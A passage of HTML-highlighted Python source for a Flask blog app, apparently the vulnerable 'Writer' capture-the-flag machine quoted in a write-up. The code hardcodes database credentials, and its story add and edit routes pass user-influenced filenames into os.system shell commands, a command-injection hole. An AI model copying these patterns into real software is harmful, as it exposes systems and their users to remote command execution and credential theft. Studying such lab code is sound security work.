+        <span class="n">connector</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="s">'admin'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'ToughPasswordToCrack'</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">database</span><span class="o">=</span><span class="s">'writer'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">connector</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_ACCESS_DENIED_ERROR</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Something is wrong with your db user name or password!"</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_BAD_DB_ERROR</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database does not exist"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Another exception, returning!"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s">'Connection to DB is ready!'</span><span class="p">)</span>
+
+<span class="c1">#Define homepage
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home_page</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM stories;"</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/blog.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+<span class="c1">#Define about page
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/about'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/about.html'</span><span class="p">)</span>
+
+<span class="c1">#Define contact page
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/contact'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">contact</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/contact.html'</span><span class="p">)</span>
+
+<span class="c1">#Define blog posts
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/blog/post/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">blog_post</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories WHERE id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM stories;"</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+    <span class="n">stories</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/blog-single.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="n">stories</span><span class="o">=</span><span class="n">stories</span><span class="p">)</span>
+
+<span class="c1">#Define dashboard for authenticated users
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">)</span>
+
+<span class="c1">#Define stories page for dashboard and edit/delete pages
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">stories</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"Select * From stories;"</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'stories.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/add'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">add_story</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]:</span>
+            <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]</span>
+            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
+                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/var/www/writer.htb/writer/static/img/'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+                <span class="n">image</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">):</span>
+            <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
+                    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv {} {}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
+                    <span class="n">image</span> <span class="o">=</span> <span class="s">"{}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
+                        <span class="n">im</span><span class="p">.</span><span class="n">verify</span><span class="p">()</span>
+                        <span class="n">im</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+                        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/tmp/'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
+                        <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+                    <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
+                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
+                        <span class="n">error</span> <span class="o">=</span> <span class="s">"Not a valid image file!"</span>
+                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="n">error</span> <span class="o">=</span> <span class="s">"Issue uploading picture"</span>
+                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+        <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'author'</span><span class="p">)</span>
+        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span>
+        <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'tagline'</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content'</span><span class="p">)</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);"</span><span class="p">,</span> <span class="p">{</span><span class="s">'author'</span><span class="p">:</span><span class="n">author</span><span class="p">,</span><span class="s">'title'</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span><span class="s">'tagline'</span><span class="p">:</span> <span class="n">tagline</span><span class="p">,</span><span class="s">'content'</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span> <span class="s">'image'</span><span class="p">:</span><span class="n">image</span> <span class="p">})</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/edit/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">edit_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]:</span>
+            <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]</span>
+            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
+                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/var/www/writer.htb/writer/static/img/'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+                <span class="n">image</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+                <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+                <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET image = %(image)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'image'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">):</span>
+            <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
+                    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv {} {}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
+                    <span class="n">image</span> <span class="o">=</span> <span class="s">"{}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
+                        <span class="n">im</span><span class="p">.</span><span class="n">verify</span><span class="p">()</span>
+                        <span class="n">im</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+                        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/tmp/'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
+                        <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+                        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+                        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET image = %(image)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'image'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
+                        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+
+                    <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
+                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
+                        <span class="n">error</span> <span class="o">=</span> <span class="s">"Not a valid image file!"</span>
+                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="n">error</span> <span class="o">=</span> <span class="s">"Issue uploading picture"</span>
+                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span>
+        <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'tagline'</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content'</span><span class="p">)</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'title'</span><span class="p">:</span><span class="n">title</span><span class="p">,</span> <span class="s">'tagline'</span><span class="p">:</span><span class="n">tagline</span><span class="p">,</span> <span class="s">'content'</span><span class="p">:</span><span class="n">content</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/delete/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">delete_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"DELETE FROM stories WHERE id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'delete.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+
+<span class="c1">#Define user page for dashboard
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/users'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">users</span><span class="p">():</span>
